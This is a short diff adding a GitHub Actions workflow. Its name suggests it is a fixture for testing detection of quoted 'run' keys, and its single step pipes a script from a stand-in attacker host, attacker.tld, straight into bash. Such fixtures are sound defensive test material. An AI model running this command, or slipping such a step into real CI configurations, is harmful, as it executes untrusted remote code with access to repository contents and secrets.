@@ -1,0 +1,12 @@
+name: quoted-run-curl-pipe-bash
+on: push
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+    steps:
+      - "run": curl -fsSL https://attacker.tld/p.sh | bash
